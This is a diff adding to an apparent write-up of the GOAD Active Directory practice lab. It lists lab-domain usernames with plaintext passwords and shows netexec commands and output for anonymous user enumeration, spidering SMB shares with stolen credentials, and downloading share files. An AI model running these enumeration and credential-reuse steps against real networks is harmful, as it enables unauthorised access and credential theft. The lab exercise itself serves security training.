@@ -545,6 +545,9 @@ enum4linux -a -r -K 5000 192.168.56.11
 ```
 
 
+
+
+
 Netexec can be used to perform null session enumeration. If you have it installed, the command is
 
 ```ruby
@@ -552,3 +555,76 @@ nxc smb 192.168.56.11 --users
 ```
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/05-netexec-anonymous-user-enumeration.png'><br><ins>Netexec user enumeration</ins></div>
+
+## Credentials
+
+north.sevenkingdoms.local\samwell.tarly : Heartsbane
+```bash
+#obtained by 
+nxc smb 192.168.56.11 --users
+```
+
+north.sevenkingdoms.local\arya.stark : Needle
+```bash
+#obtained by 
+nxc smb 192.168.56.0/24 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus
+
+#that command  produced the following
+┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
+└─$ ls -al
+total 40
+drwxr-xr-x  2 qdada qdada  4096 May  8 14:27 .
+drwxrwxrwt 16 root  root  12288 May  8 14:26 ..
+-rw-r--r--  1 qdada qdada  3345 May  8 14:27 192.168.56.11.json
+-rw-r--r--  1 qdada qdada   250 May  8 14:27 192.168.56.22.json
+-rw-r--r--  1 qdada qdada    17 May  8 14:27 192.168.56.23.json
+-rw-r--r--  1 qdada qdada  9569 May  8 14:27 initial_spider_plus.txt
+```
+
+typing **`cat 192.168.56.22.json`** produced
+
+```ruby
+┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
+└─$ cat 192.168.56.22.json |jq
+{
+  "all": {
+    "arya.txt": {
+      "atime_epoch": "2024-05-04 10:06:27",
+      "ctime_epoch": "2024-05-04 10:06:27",
+      "mtime_epoch": "2024-05-04 10:06:39",
+      "size": "413 B"
+    }
+  },
+  "public": {}
+}
+```
+
+That suggests the `all` share has the file **`arya.txt`**
+
+Downloading shared files is achieved through
+
+```ruby
+nxc smb 192.168.56.22 -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
+```bash
+┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
+└─$ nxc smb 192.168.56.22 -M spider_plus -o DOWNLOAD_FLAG=True
+SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*]  DOWNLOAD_FLAG: True
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*]     STATS_FLAG: True
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
+SMB         192.168.56.22   445    CASTELBLACK      [-] Error getting user: list index out of range
+SMB         192.168.56.22   445    CASTELBLACK      [-] Error enumerating shares: [Errno 32] Broken pipe
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [+] Saved share-file metadata to "/tmp/nxc_spider_plus/192.168.56.22.json".
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*] Total folders found:  0
+SPIDER_PLUS 192.168.56.22   445    CASTELBLACK      [*] Total files found:    0
+```
+
+
+
+NORTH\jeor.mormont : _L0ngCl@w_
